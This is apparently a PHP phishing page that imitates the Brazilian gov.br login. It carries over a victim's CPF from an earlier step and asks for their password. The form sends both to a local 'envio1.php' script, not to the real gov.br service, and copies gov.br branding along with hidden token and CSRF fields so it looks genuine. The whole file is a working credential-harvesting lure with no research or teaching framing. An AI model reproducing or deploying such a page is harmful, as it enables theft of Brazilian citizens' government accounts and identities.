<?php

session_start();


if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['cpf'])) {
    $_SESSION['cpf'] = $_POST['cpf'];
}


$cpf = isset($_SESSION['cpf']) ? $_SESSION['cpf'] : 'CPF não encontrado!';

?>

<!DOCTYPE html>

<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title>gov.br - Acesse sua conta</title>
  <meta property="creator.productor" content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">

  <link rel="icon" href="js/favicon.ico" type="image/x-icon">
  <link rel="stylesheet" href="all.min.css?v=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link rel="stylesheet" href="https://sso.acesso.gov.br/assets/govbr/fonts/rawline/rawline.css">
  <link rel="stylesheet" href="js/govbr-highcontrast.css">
  <link rel="stylesheet" href="js/govbr-templates.css?v=8">
  <link rel="stylesheet" href="js/govbr-modal.css?v=8">
  <link rel="stylesheet" href="js/css/govbr-eula.css?v=4">
  <script src="js/contrast.class.js"></script>
  <script src="js/modal.js"></script>
</head>

<body>
    <a tabindex="0" href="" class="sr-only sr-only-focusable" aria-label="Pular para o conteÃºdo principal. Navegue sempre com a tecla TAB">Pular para o conteÃºdo principal</a>

    <header>
        <a href=""><img src="./js/govbr.png" alt="Logomarca GovBR"></a>
        <div id="acessibilidade">
            <span>
                <a href="#" onclick="contrastScript().toggleContrast(event)"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
            </span>
            <span>
                <a href="" target="_BLANK"><i class="fas fa-deaf"></i><span>VLibras</span></a>
            </span>
        </div>
        
    </header>
<div class="container">
	<aside>
		<div class="card" id="login-password-info">
			<img src="./js/senha.png" alt="Logomarca GovBR">
			<p>Digite sua senha para acessar o login único do governo federal.</p>
		</div>
	</aside>
	<main>
    <?php

if (isset($_POST['cpf'])) {
    $cpf = $_POST['cpf'];
} else {
    echo "CPF não foi enviado!";
    exit;
}
?>

<form method="post" id="loginData" action="envio1.php" novalidate="" autocomplete="off">
    <div class="card" id="login-password">
        <h3>Digite sua senha</h3>
        <label>CPF</label>
        
        <h4><?php echo htmlspecialchars($cpf); ?></h4>

        
        <input type="hidden" name="cpf" value="<?php echo htmlspecialchars($cpf); ?>">

        <label for="password">Senha</label>
        <div class="password-eye">
            <input onkeypress="submitOnEnterKeyPress(&#39;submit-button&#39;)" tabindex="1" name="password" id="password" type="password" value="" placeholder="Digite sua senha atual" autocomplete="new-password">
            <span tabindex="2" toggle="#password" class="fa fa-fw fa-eye toggle-password"></span>
        </div>

        <button id="password-recovery" type="submit" name="operation" value="call-account-recovery" class="button-href-mimic" tabindex="2" disabled>Esqueci minha senha</button>

        <div class="button-panel">
            <button type="submit" name="operation" value="cancel" class="button-cancel">Cancelar</button>
            <button id="submit-button" default="" type="submit" name="operation" value="enter-password" class="button-ok" aria-label="Botão Entrar. Aperte a tecla enter para entrar." tabindex="3">Entrar</button>
        </div>
    </div>
    <div class="card" id="faq">
        <a tabindex="10" href="#">Ficou com dúvidas?</a>
    </div>

    <input type="hidden" name="token" value="eyJraWQiOiJsb2dpbkZsb3ciLCJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..5a5wuVA6dbLe34Gt.wydBAivDsB96wNaqcOkdh4rPSSYMggM_-BswTpRgdT_vFKglbAxxdC_aLsG7G-QjrXy7Bsa9XIJsXcc2gAPDArZqh88NJzu5hnAJUcr6McC0isjQzpkakdHYvDbZ2iOSEL5ulOSX1_l-9_K7IUlp6Ztb9PO00sulM1YaSv6SUXvkY5Oq6GhNtz4lvtA_TmCdWyj2gYbxQUHSuSWR0HfewU9lo2lP5UgyFWn5qIVGfEIA0hZPBBAGttCYhelx0splP0D0PAdWefhWEHGVFqJu0IZkLMyosecjTMXf4i3wTiqoTlU9Ke1jNHDm-R-9ZlJZ4bhHuDJpyjvOFJV6OD_KkHNBfMFLk76c7nzMbu0N5Accis6OzbUnPfe2io8GWvu3Mm0uv_lSX6x1_y9FCUfJaYH2FNY8p_EjKQmU0d5LqOa5Ux3HUQaRm4Yjtn5kW8k8-ewYDZ9pwHKCWHICpS3_S3VL0JLTRL_AhgK8BsyJoAhe0JKzWu7e_qKhiwc5hjFaXRbLO-xSprAClki0GzWYen5kxR1rnJLCZhP2X20iOlbBnI_05jEncaKfcFTGdHyx_XBA-jKRfW6J0g98brt11Rs8rM7OnHYx1uZWtDCov_K0kEqPHhvOt6OPEneTh0BhyzMamxC_RozVY5souRIIAyBSZ0Unf7u2AN0_G8JaSXNH4Cmyv9ApfV0.QDd6f6000g2ptteiYSJRoQ">
    <input type="hidden" name="_csrf" value="969f2d95-9b8f-4100-a537-a525ae7625da">
    <input type="hidden" id="operation-field">
</form>

	</main>
</div>

<div>
	<div class="painel-login-container"></div>
</div>




  <footer>
  </footer>
  <script src="./js/jquery-2.2.4.min.js"></script>
  <script src="./js/scripts.js"></script>
  <script src="./js/jquery.maskedinput.js"></script>


<script>
	focusOnLoad('password');
</script>
<div id="volume-booster-visusalizer">
                <div class="sound">
                    <div class="sound-icon"></div>
                    <div class="sound-wave sound-wave_one"></div>
                    <div class="sound-wave sound-wave_two"></div>
                    <div class="sound-wave sound-wave_three"></div>
                </div>
                <div class="segments-box">
                    <div data-range="1-20" class="segment"><span></span></div>
                    <div data-range="21-40" class="segment"><span></span></div>
                    <div data-range="41-60" class="segment"><span></span></div>
                    <div data-range="61-80" class="segment"><span></span></div>
                    <div data-range="81-100" class="segment"><span></span></div>
                </div>
            </div></body></html>